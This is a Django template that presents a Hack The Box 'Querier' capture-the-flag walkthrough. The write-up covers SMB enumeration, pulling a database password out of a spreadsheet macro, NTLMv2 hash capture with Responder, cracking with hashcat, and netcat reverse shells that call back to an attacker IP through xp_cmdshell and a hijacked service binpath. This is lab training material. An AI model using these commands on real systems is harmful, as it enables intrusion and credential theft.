@@ -1,0 +1,389 @@
+{% extends 'writeapp/base.html' %}
+
+{% load static %}
+
+{% block content %}
+
+<div id="overlay" class="overlay"></div>
+<div class="container-fluid p-5">
+    <div class="row">
+        <div class="form-group col-md-12">
+            <h2>HacktheBox — Querier</h2>
+            <img src="{% static 'writeapp/img/querier.png' %}"  class="img-fluid" alt="">
+            <br><br><br>
+            <p> <strong>About this box:</strong> </p>
+            <p>This is rated as a medium difficulty machine but once proper enumeration is done, the rest of the  steps towards root are straightforward.</p>
+
+            <p> <strong>Summary:</strong> </p>
+            <ul>
+              <li>NMAP discovers open SMB and MSSQL ports.</li>
+              <li>Obtained user creds from an xlsm file found on SMB share</li>
+              <li>Logged in to MSSQL using impacket <code>mssqlclient.py </code> </li>
+              <li>Acquire mssql-svc hash using responder and mssql xp_dirtree command</li>
+              <li>Used winPeas to find potential priv escalation</li>
+            </ul>
+            <hr>
+            <p>We start with doing NMAP to discover open ports and services.</p>
+            <img src="{% static 'writeapp/img/1st.png' %}"  class="img-fluid" alt="">
+            <p>We see <code>smb</code> and <code>mssql</code> open.</p>
+        </div>
+
+        <div class="form-group col-md-12">
+          <p> <strong>SMB Enumeration</strong> </p>
+          <p>Checked smb null session.</p>
+
+
+<pre class="code">
+<code>
+fsor@kali:~$ smbmap -H 10.10.10.125 -u '%'
+[+] Guest session       IP: 10.10.10.125:445    Name: 10.10.10.125
+Disk                                                    Permissions     Comment
+----                                                    -----------     -------
+ADMIN$                                                  NO ACCESS       Remote Admin
+C$                                                      NO ACCESS       Default share
+IPC$                                                    READ ONLY       Remote IPC
+Reports                                                 READ ONLY
+</code>
+</pre>
+
+
+          <p>We see that we have RO access on <code> /Reports </code> </p>
+
+          <p>We login to this share to see the contents.</p>
+
+
+<pre class="code">
+<code>
+fsor@kali:~$  smbclient -U '%' -N \\\\10.10.10.125\\Reports
+Try "help" to get a list of possible commands.
+smb: \> dir
+.                                   D        0  Mon Jan 28 15:23:48 2019
+..                                  D        0  Mon Jan 28 15:23:48 2019
+Currency Volume Report.xlsm         A    12229  Sun Jan 27 14:21:34 2019
+
+      6469119 blocks of size 4096. 1590434 blocks available
+smb: \>
+</code>
+</pre>
+
+
+
+        <p>We download the xlsm file  by doing  |   <code> get “Currency Volume Report.xlsm”</code></p>
+        <p>The filename is too long so I decied to rename it to <code>cur.xlsm</code></p>
+
+        <p>I was stuck trying to figure out whether this file has a purpose since I have no knowlege of xlsm file, I thought it is just a regular
+spreadsheet with nothing in it.</p>
+
+        <p>I opened the file using MSExcel and the file is blank.</p>
+        <img src="{% static 'writeapp/img/2nd.png' %}"  class="img-fluid" alt="">
+        <br><br>
+        <p>At this point, I know I can't exploit mssql without a valid credential,</p>
+        <p>( I don't want to brute force my way in) so I have to spend time googling about this file and found out that this file is a spreadsheet that contains macros.</p>
+        <img src="{% static 'writeapp/img/3rd.png' %}"  class="img-fluid" alt="">
+        <br><br><br>
+        <p>Given that there is a mssql db, it is possible that there is a macro connecting to the DB. </p>
+        <p>My current version of MS does not allow viewing of macros, so I have to use a tool called olevba to extract the macro from this file.</p>
+
+<pre class="code">
+<code>
+fsor@kali:/opt/HTB/Querier$ olevba cur.xlsm
+olevba 0.55.1 on Python 3.8.5 - http://decalage.info/python/oletools
+===============================================================================
+FILE: cur.xlsm
+Type: OpenXML
+Error: [Errno 2] No such file or directory: 'xl/vbaProject.bin'.
+-------------------------------------------------------------------------------
+VBA MACRO ThisWorkbook.cls
+in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+' macro to pull data for client volume reports
+'
+' further testing required
+
+Private Sub Connect()
+
+Dim conn As ADODB.Connection
+Dim rs As ADODB.Recordset
+
+Set conn = New ADODB.Connection
+conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
+conn.ConnectionTimeout = 10
+conn.Open
+
+If conn.State = adStateOpen Then
+
+' MsgBox "connection successful"
+
+'Set rs = conn.Execute("SELECT * @@version;")
+Set rs = conn.Execute("SELECT * FROM volume;")
+Sheets(1).Range("A1").CopyFromRecordset rs
+rs.Close
+
+End If
+
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO Sheet1.cls
+in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+(empty macro)
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|Suspicious|Open                |May open a file                              |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
++----------+--------------------+---------------------------------------------+
+</code>
+</pre>
+
+        <p>Now we have creds for the mssql db</p>
+        <p>Uid = <code>reporting</code> </p>
+        <p>Pwd= <code>PcwTWTHRwryjc$c6</code></p>
+
+        <br><br>
+        <p>Loggedin to sqldb using impacket mssqlclient .</p>
+
+<pre class="code">
+<code>
+root@kali:/opt/HTB/Querier# mssqlclient.py  reporting@10.10.10.125 -windows-auth
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
+[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
+[!] Press help for extra shell commands
+SQL>
+</code>
+</pre>
+
+        <p>We can play around and do SQL commands to extract information.</p>
+        <p>Since we only have limited privilege from the current user , there isn't much we can do.</p>
+        <br>
+        <p>To elevate the privilege on mssql, we will use a tool called <code> responder.</code></p>
+        <p>On Attacker  machine:</p>
+        <p> responder  -I tun0</p>
+        <img src="{% static 'writeapp/img/4th.png' %}"  class="img-fluid" alt="">
+
+        <br><br>
+        <p> On Victim machine:</p>
+
+<pre class="code">
+<code>
+SQL>  xp_dirtree '\\10.10.14.27\htb\test'
+</code>
+</pre>
+
+        <p>Back on our Kali, our responder has captured the hash/</p>
+
+<pre class="code">
+<code>
+[+] Listening for events...
+[SMB] NTLMv2-SSP Client   : 10.10.10.125
+[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
+[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:d622ae5ef4a1f04b:BDECDC12C3B86806F6713A227460EEE6:0101000000000000C0653150DE09D2011316C191E82EC287000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000CC37753DE669818D407202825288AB3175AA75A50ACBDAFBA74E12378313D6CA0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003700000000000000000000000000
+[*] Skipg previously captured hash for QUERIER\mssql-svc
+</code>
+</pre>
+
+        <p> When the target machine tries to connect to our SMB server, the responder will poison the LLMNR and spoof SMB Request in order to grab NTLMv2 hash.
+<br><br>For more info: </p>
+
+
+
+        <a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a>
+        <br>
+        <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/c083583f-1a8f-4afe-a742-6ee08ffeb8cf">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/c083583f-1a8f-4afe-a742-6ee08ffeb8cf</a>
+
+        <p><br>Then use hashcat to crack the hash.</p>
+        <code>hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</code>
+
+        <p>PW cracked: <code> corporate568</code></p>
+
+        <br><br>
+        <p>We then logged in as mssql-svc on db</p>
+
+<pre class="code">
+<code>
+root@kali:/opt/HTB/Querier# mssqlclient.py  mssql-svc@10.10.10.125 -windows-auth
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
+[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
+[!] Press help for extra shell commands
+SQL>
+</code>
+</pre>
+        <p>Since we have elevated our priv on the database, we can now run shell commands using <code> xp_cmdshell</code></p>
+
+<pre class="code">
+<code>
+SQL> enable_xp_cmdshell
+[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+
+SQL> xp_cmdshell whoami
+output
+
+--------------------------------------------------------------------------------
+
+querier\mssql-svc
+
+NULL
+SQL>
+</code>
+</pre>
+
+        <p>We tested this first using whoami and it gave us the running user <code> querier\mssql-svc.</code></p>
+        <p>Let us now perform a reverse shell.</p>
+        <br>
+        <p>I fired up impacket smbd server and placed netcat on shared folder..</p>
+
+
+<pre class="code">
+<code>
+fsor@kali:/srv/smb#  impacket-smbserver kali  /srv/smb  -smb2support
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+</code>
+</pre>
+
+        <br><br>
+        <p>Then on MSSQL:</p>
+
+<pre class="code">
+<code>
+SQL>  xp_cmdshell \\10.10.14.27\kali\nc64.exe -e cmd 10.10.14.27 9001
+</code>
+</pre>
+
+        <br>
+        <p>We got a shell!</p>
+        <img src="{% static 'writeapp/img/5th.png' %}"  class="img-fluid" alt="">
+        <br><br>
+        <hr>
+        <strong>Privilege Escalation</strong>
+        <br><br>
+        <p>Running whoami /priv command will show that we have SE impersonate privilege but we can't use token abuse since the box is a windows server 2019.</p>
+        <p>I used a tool called winPeas to check for possible priv escalation and there are two methods.</p>
+        <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS</a>
+        <br>
+        <br>
+        <br>
+        <p>1st method, found a gpp Admin pw and we can easily elevate priv using psexec. </p>
+<pre class="code">
+<code>
+C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
+Found C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
+UserName: Administrator
+NewName: [BLANK]
+cPassword: MyUnclesAreMarioAndLuigi!!1!
+Changed: 2019-01-28 23:12:48
+</code>
+</pre>
+
+        <p>2nd method: </p>
+        <p><code>UsoSVC</code> is a service running as localsystem .</p>
+        <p>Since we have full access, we can modify the binary path to obtain admin shell.</p>
+        <br>
+        <p>We will use this method.</p>
+
+<pre class="code">
+<code>
+[+] Modifiable Services(T1007)
+[?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
+UsoSvc: AllAccess, Start
+</code>
+</pre>
+
+        <p>We first copy netcat on target machine . Our impacket smb server is still running.</p>
+        <code>C:\tmp> copy \\10.10.14.27\kali\nc64.exe</code>
+        <br><br>
+        <p>Then check the current bin path of the uso svc :</p>
+
+<pre class="code">
+<code>
+C:\>sc qc usosvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: usosvc
+TYPE               : 20  WIN32_SHARE_PROCESS
+START_TYPE         : 2   AUTO_START  (DELAYED)
+ERROR_CONTROL      : 1   NORMAL
+BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs -p
+LOAD_ORDER_GROUP   :
+TAG                : 0
+DISPLAY_NAME       : Update Orchestrator Service
+DEPENDENCIES       : rpcss
+SERVICE_START_NAME : LocalSystem
+
+C:\>sc qc usosvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: usosvc
+TYPE               : 20  WIN32_SHARE_PROCESS
+START_TYPE         : 2   AUTO_START  (DELAYED)
+ERROR_CONTROL      : 1   NORMAL
+BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs -p
+LOAD_ORDER_GROUP   :
+TAG                : 0
+DISPLAY_NAME       : Update Orchestrator Service
+DEPENDENCIES       : rpcss
+SERVICE_START_NAME : LocalSystem
+</code>
+</pre>
+
+        <p>We will then change the binary path and point it towards netcat to perform a reverseshell.</p>
+        <code>sc config usosvc binpath="c:\tmp\nc64.exe -e cmd 10.10.14.27 4445"  </code>
+        <p>We can verify using <code> sc qc usosvc </code> that the binarytpath has changed.</p>
+        <img src="{% static 'writeapp/img/6th.png' %}"  class="img-fluid" alt="">
+        <p>Then stop and start the service </p>
+        <code>
+          sc stop usosvc
+          <br>
+          sc start usosvc
+        </code>
+
+        <br><br>
+        <p>And we are now <code> nt authority/system</code></p>
+        <img src="{% static 'writeapp/img/7th.png' %}"  class="img-fluid" alt="">
+
+        <p>
+<pre class="code">
+<code>
+C:\Windows\system32>
+more C:\Users\Administrator\Desktop\root.txt
+more C:\Users\Administrator\Desktop\root.txt
+b19c3794f.......................
+</code>
+</pre>
+
+
+
+        </div>
+
+    </div>
+</div>
+
+
+{% endblock %}
